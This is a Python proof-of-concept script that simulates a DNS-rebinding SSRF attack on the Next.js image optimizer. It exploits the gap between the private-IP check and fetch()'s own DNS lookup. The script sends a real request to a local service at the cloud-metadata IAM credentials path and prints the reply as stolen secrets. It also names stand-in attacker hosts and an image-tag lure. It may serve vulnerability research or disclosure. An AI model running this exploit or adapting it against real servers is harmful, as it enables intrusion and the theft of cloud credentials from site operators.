#!/usr/bin/env python3
"""
FULL SSRF ATTACK SIMULATION
============================
This simulates what happens when a victim's Next.js server 
processes an attacker's malicious image URL.

The attack:
1. Attacker tricks victim to load: /_next/image?url=http://evil.com/x.png
2. Next.js does DNS lookup → gets 8.8.8.8 → passes isPrivateIp()
3. Next.js fetch() makes NEW DNS lookup → gets 127.0.0.1 → SSRF!
4. Attacker steals internal secrets
"""

import socket
from collections import defaultdict

# Attacker's DNS rebinding logic (simulating our DNS server)
query_count = defaultdict(int)
PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"

def attacker_dns_lookup(hostname):
    """Simulates attacker's DNS server that returns alternating IPs"""
    query_count[hostname] += 1
    count = query_count[hostname]
    ip = PUBLIC_IP if count % 2 == 1 else PRIVATE_IP
    print(f"[ATTACKER DNS] Query #{count} for {hostname} -> {ip}")
    return [ip]

def is_private_ip(ip):
    """Next.js isPrivateIp check"""
    private_ranges = [
        ip.startswith('127.'),
        ip.startswith('10.'),
        ip.startswith('192.168.'),
        ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31,
        ip.startswith('169.254.'),
        ip == '0.0.0.0',
    ]
    return any(private_ranges)

def fetch_external_image(href, target_port=8888):
    """
    Simulates Next.js fetchExternalImage() from image-optimizer.ts
    Lines 711-784
    """
    from urllib.parse import urlparse
    import http.client
    
    parsed = urlparse(href)
    hostname = parsed.hostname
    
    print("\n" + "=" * 60)
    print(" NEXT.JS IMAGE OPTIMIZER - fetchExternalImage()")
    print("=" * 60)
    print(f"\n[NEXT.JS] Processing image URL: {href}")
    
    # STEP 1: DNS lookup for validation (line 720)
    print("\n[STEP 1] First DNS lookup (for validation - line 720)")
    ips = attacker_dns_lookup(hostname)
    print(f"         Resolved IPs: {ips}")
    
    # STEP 2: isPrivateIp check (line 727)
    print("\n[STEP 2] isPrivateIp check (line 727)")
    private_ips = [ip for ip in ips if is_private_ip(ip)]
    for ip in ips:
        status = "PRIVATE ❌" if is_private_ip(ip) else "PUBLIC ✓"
        print(f"         {ip} -> {status}")
    
    if private_ips:
        print(f"\n❌ BLOCKED: Private IP detected: {private_ips}")
        return None
    
    print("\n✅ VALIDATION PASSED!")
    
    # STEP 3: fetch() - does its own DNS lookup! (line 738)
    print("\n[STEP 3] fetch() makes request (line 738)")
    print("         fetch() does its OWN DNS lookup...")
    
    fetch_ips = attacker_dns_lookup(hostname)
    fetch_ip = fetch_ips[0]
    
    print(f"\n[STEP 3b] Connecting to {fetch_ip}:{target_port}")
    
    if is_private_ip(fetch_ip):
        print(f"\n🔥🔥🔥 SSRF TRIGGERED! 🔥🔥🔥")
        print(f"         First lookup:  {PUBLIC_IP} (passed check)")
        print(f"         Second lookup: {fetch_ip} (hits internal service!)")
        
        # Actually make the request to demonstrate the attack
        print(f"\n[ATTACKING] Fetching http://{fetch_ip}:{target_port}/latest/meta-data/iam/security-credentials/")
        
        try:
            conn = http.client.HTTPConnection(fetch_ip, target_port, timeout=5)
            conn.request("GET", "/latest/meta-data/iam/security-credentials/")
            response = conn.getresponse()
            data = response.read().decode()
            
            print("\n" + "=" * 60)
            print(" 💀 STOLEN SECRETS FROM VICTIM'S INTERNAL API 💀")
            print("=" * 60)
            print(data)
            print("=" * 60)
            
            return data
        except Exception as e:
            print(f"  Connection error: {e}")
            return None
    else:
        print("  Second lookup returned public IP (try again)")
        return None

if __name__ == "__main__":
    print("=" * 60)
    print(" ATTACKER: Executing SSRF Attack via DNS Rebinding")
    print("=" * 60)
    print("\nTarget: Victim's Next.js app with image optimization")
    print("Goal: Steal secrets from victim's internal API (port 8888)")
    print()
    
    # This URL would be embedded in attacker's webpage as:
    # <img src="http://victim.com/_next/image?url=http://evil.com/x.png&w=100&q=75">
    malicious_url = "http://evil.attacker.com/malicious-image.png"
    
    result = fetch_external_image(malicious_url, target_port=8888)
    
    if result:
        print("\n🎯 ATTACK SUCCESSFUL! Secrets exfiltrated!")
    else:
        print("\n⚠️  Attack failed this attempt (timing-based)")
